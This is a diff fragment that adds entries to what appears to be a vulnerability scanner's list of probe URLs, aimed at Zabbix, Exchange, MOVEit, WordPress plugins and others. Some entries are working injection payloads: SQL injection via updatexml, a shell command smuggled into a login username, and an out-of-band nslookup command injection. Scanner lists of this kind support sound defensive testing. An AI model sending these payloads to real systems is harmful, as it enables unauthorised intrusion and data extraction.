@@ -375,3 +375,14 @@
 /mdiy/dict/listExcludeApp?query=1&dictType=1&orderBy=1/**/or/**/updatexml(1,concat(0x7e,md5(
 /mdiy/dict/listExcludeApp.do?query=1&dictType=1&orderBy=1/**/or/**/updatexml(1,concat(0x7e,md5(
 /rc/?command=shutdown&param=$(nslookup+{{randstr}}.{{interactsh-url}})
+/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)::
+/auth/newpassword
+/owa/auth/logon.aspx
+/moveitisapi/moveitisapi.dll?action=capa
+/wp-content/plugins/local-sync/README.txt
+/cgi-bin/login.lua?action=login&password=x&username=%22;id;echo%20%22
+/wp-content/plugins/drag-and-drop-file-upload-for-elementor-forms/readme.txt
+/wp-content/uploads/elementor/forms/temp/{{uploaded_filename}}
+/api/v1/configs
+/api/v1/main/flows/{{namespace}}/ordinary
+/api/v1/main/flows/{{namespace}}/configs
